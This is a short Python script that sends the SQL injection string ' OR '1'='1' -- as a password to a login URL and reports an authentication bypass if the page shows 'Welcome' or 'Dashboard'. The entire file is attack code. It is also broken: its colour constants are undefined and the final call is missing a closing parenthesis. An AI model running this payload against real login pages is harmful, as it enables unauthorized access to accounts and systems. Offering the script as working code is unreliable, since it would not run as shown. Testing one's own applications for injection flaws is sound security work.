import urllib.request

def test_auth_bypass(url):
    payload = "' OR '1'='1' --"
    test_url = f"{url}?username=admin&password={urllib.parse.quote(payload)}"

    try:
        response = urllib.request.urlopen(test_url)
        content = response.read().decode()
        
        if "Welcome" in content or "Dashboard" in content:
            print(f"{RED}[VULNERABLE]{RESET} Authentication bypass detected at {url}")
        else:
            print(f"{GREEN}[SAFE]{RESET} No authentication bypass found.")
    except:
        print(f"{YELLOW}[ERROR]{RESET} Could not connect to {url}")

test_auth_bypass("http://example.com/login"
